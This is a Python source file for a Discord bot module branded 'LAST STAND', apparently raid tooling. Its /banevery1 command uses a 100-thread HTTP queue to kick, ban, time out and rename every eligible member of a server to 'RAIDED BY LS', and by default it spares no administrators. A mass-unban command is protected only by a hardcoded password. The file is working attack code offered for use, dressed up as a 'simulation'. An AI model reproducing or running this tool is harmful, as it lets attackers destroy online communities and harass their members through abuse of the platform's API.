"""
ban.py — LAST STAND | /banevery1, /unban
Mass ban + kick + unban via 100-thread raw HTTP queue (c-realV2.py port).
"""

import asyncio
import datetime

import discord
import requests
from discord import app_commands
from discord.ext import commands

from utils.http_queue import HttpQueue, API_BASE
from utils.state import bot_state

RAID_TAG       = "LAST STAND"
UNBAN_PASSWORD = "hellonice"


class Ban(commands.Cog):
    def __init__(self, bot: commands.Bot) -> None:
        self.bot = bot

    @app_commands.command(
        name="banevery1",
        description="☠️ Mass ban + kick all members via 100-thread raw HTTP queue.",
    )
    @app_commands.describe(
        intensity="Ban rate 1–10. Default 10.",
        skip_admins="Skip members with Administrator. Default False.",
        kick_first="Kick before banning (double-action flood). Default True.",
    )
    @app_commands.guild_only()
    async def banevery1(
        self,
        interaction: discord.Interaction,
        intensity: int = 10,
        skip_admins: bool = False,
        kick_first: bool = True,
    ) -> None:
        if bot_state.active_simulation:
            await interaction.response.send_message(
                f"⚠️ **{bot_state.active_simulation}** is running. Use `/stop` first.",
                ephemeral=True,
            )
            return

        if not 1 <= intensity <= 10:
            await interaction.response.send_message("❌ Intensity must be 1–10.", ephemeral=True)
            return

        guild = interaction.guild
        me    = guild.me

        missing: list[str] = []
        if not me.guild_permissions.ban_members:
            missing.append("Ban Members")
        if kick_first and not me.guild_permissions.kick_members:
            missing.append("Kick Members")
        if missing:
            await interaction.response.send_message(
                f"❌ Bot is missing: **{', '.join(missing)}**", ephemeral=True
            )
            return

        await interaction.response.defer()

        try:
            try:
                await asyncio.wait_for(guild.chunk(cache=True), timeout=10.0)
            except Exception:
                pass

            targets = [
                m for m in guild.members
                if not m.bot
                and m.id != interaction.user.id
                and m.id != me.id
                and (not skip_admins or not m.guild_permissions.administrator)
                and m.top_role < me.top_role
            ]

            if not targets:
                await interaction.followup.send(
                    "⚠️ No eligible targets found.\n"
                    "• All members have a role ≥ bot's role\n"
                    "• Server Members Intent not enabled\n"
                    "• No non-bot members other than you",
                    ephemeral=True,
                )
                return

            bot_state.reset()
            bot_state.rate_controller.set_intensity(intensity)
            bot_state.active_simulation = "banevery1"

            await interaction.followup.send(
                f"☠️ **MASS BAN+KICK — {RAID_TAG}**\n"
                f"┣ Targets    : `{len(targets)}`\n"
                f"┣ Intensity  : `{intensity}/10`\n"
                f"┣ Kick first : `{'✅' if kick_first else '❌'}`\n"
                f"┣ Skip admins: `{'✅' if skip_admins else '❌'}`\n"
                f"┣ Engine     : `100-thread raw HTTP queue`\n"
                f"┗ `/stop` halts immediately.",
            )

            task = asyncio.create_task(self._run(interaction, guild, targets, kick_first))
            bot_state.add_task(task)

        except Exception as exc:
            bot_state.active_simulation = None
            try:
                await interaction.followup.send(f"❌ Error: `{exc}`", ephemeral=True)
            except Exception:
                pass

    async def _run(
        self,
        interaction: discord.Interaction,
        guild: discord.Guild,
        members: list[discord.Member],
        kick_first: bool,
    ) -> None:
        q = HttpQueue.get()

        try:
            if kick_first:
                for m in members:
                    q.put(requests.delete, f"{API_BASE}/guilds/{guild.id}/members/{m.id}")
                await q.join()

            timeout_until = (
                datetime.datetime.utcnow() + datetime.timedelta(days=28)
            ).strftime("%Y-%m-%dT%H:%M:%S.000Z")

            for m in members:
                q.put(
                    requests.put,
                    f"{API_BASE}/guilds/{guild.id}/bans/{m.id}",
                    {"delete_message_days": 0},
                )
                q.put(
                    requests.patch,
                    f"{API_BASE}/guilds/{guild.id}/members/{m.id}",
                    {"communication_disabled_until": timeout_until, "nick": "RAIDED BY LS"},
                )

            await q.join()

        except asyncio.CancelledError:
            q.clear()
        finally:
            if bot_state.active_simulation == "banevery1":
                bot_state.active_simulation = None
            try:
                await interaction.followup.send(
                    f"☠️ **Ban+Kick complete — {RAID_TAG}**\n"
                    f"┣ Targets processed : `{len(members)}`\n"
                    f"┗ Engine            : `100-thread raw HTTP queue`"
                )
            except Exception:
                pass

    @banevery1.error
    async def banevery1_error(self, interaction: discord.Interaction, error: app_commands.AppCommandError) -> None:
        msg = "❌ You need **Administrator** permission." if isinstance(error, app_commands.MissingPermissions) else f"❌ {error}"
        try:
            if interaction.response.is_done():
                await interaction.followup.send(msg, ephemeral=True)
            else:
                await interaction.response.send_message(msg, ephemeral=True)
        except Exception:
            pass

    # ── /unban ─────────────────────────────────────────────────────────────────

    @app_commands.command(
        name="unban",
        description="✅ Mass-unban everyone in this server. Requires password.",
    )
    @app_commands.describe(password="Required password to run this command.")
    @app_commands.guild_only()
    async def unban(self, interaction: discord.Interaction, password: str) -> None:
        if password != UNBAN_PASSWORD:
            await interaction.response.send_message("❌ Wrong password.", ephemeral=True)
            return

        guild = interaction.guild

        if not guild.me.guild_permissions.ban_members:
            await interaction.response.send_message(
                "❌ Bot is missing **Ban Members** permission.", ephemeral=True
            )
            return

        await interaction.response.defer()

        try:
            try:
                bans: list[discord.BanEntry] = [entry async for entry in guild.bans()]
            except discord.HTTPException as exc:
                await interaction.followup.send(f"❌ Failed to fetch ban list: {exc}", ephemeral=True)
                return

            if not bans:
                await interaction.followup.send("✅ No one is currently banned.", ephemeral=True)
                return

            await interaction.followup.send(
                f"✅ **MASS UNBAN — {RAID_TAG}**\n"
                f"┣ Found  : `{len(bans)}` banned users\n"
                f"┣ Engine : `100-thread raw HTTP queue`\n"
                f"┗ Unbanning now…"
            )

            task = asyncio.create_task(self._run_unban(interaction, guild, bans))
            bot_state.add_task(task)

        except Exception as exc:
            try:
                await interaction.followup.send(f"❌ Error: `{exc}`", ephemeral=True)
            except Exception:
                pass

    async def _run_unban(
        self,
        interaction: discord.Interaction,
        guild: discord.Guild,
        bans: list[discord.BanEntry],
    ) -> None:
        q = HttpQueue.get()

        try:
            for entry in bans:
                q.put(requests.delete, f"{API_BASE}/guilds/{guild.id}/bans/{entry.user.id}")
            await q.join()
        except asyncio.CancelledError:
            q.clear()
        finally:
            try:
                await interaction.followup.send(
                    f"✅ **Unban complete — {RAID_TAG}**\n"
                    f"┣ Processed : `{len(bans)}` users\n"
                    f"┗ Engine    : `100-thread raw HTTP queue`"
                )
            except Exception:
                pass

    @unban.error
    async def unban_error(self, interaction: discord.Interaction, error: app_commands.AppCommandError) -> None:
        msg = "❌ You need **Administrator** permission." if isinstance(error, app_commands.MissingPermissions) else f"❌ {error}"
        try:
            if interaction.response.is_done():
                await interaction.followup.send(msg, ephemeral=True)
            else:
                await interaction.response.send_message(msg, ephemeral=True)
        except Exception:
            pass


async def setup(bot: commands.Bot) -> None:
    await bot.add_cog(Ban(bot))
